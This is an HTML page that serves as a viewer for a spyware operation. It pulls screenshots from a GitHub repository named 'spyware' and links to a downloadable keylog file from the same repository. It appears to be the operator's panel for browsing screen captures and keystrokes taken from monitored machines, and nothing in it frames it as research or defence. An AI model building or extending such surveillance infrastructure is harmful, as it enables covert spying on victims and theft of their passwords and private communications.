<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Monitoring - Screenshots and Keylogs</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        img {
            width: 400px;
            height: auto;
            margin: 10px;
        }
    </style>
</head>
<body>
    <h1>Remote Monitoring - Screenshots and Keylogs</h1>
    
    <h2>Screenshots</h2>
    <div id="screenshots">
        <!-- Auto-updating list of images -->
        <script>
            const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
            fetch(repo)
                .then(response => response.json())
                .then(data => {
                    data.forEach(file => {
                        if (file.name.endsWith(".png")) {
                            let img = document.createElement("img");
                            img.src = file.download_url; // Use the download URL directly
                            document.getElementById("screenshots").appendChild(img);
                        }
                    });
                })
                .catch(error => console.error('Error fetching screenshots:', error));
        </script>
    </div>

    <h2>Keylogs</h2>
    <!-- Keylog file link -->
    <a href="https://github.com/shrijaybaheti/spyware/raw/main/keylog.txt" download>Download Keylog</a>

</body>
</html>
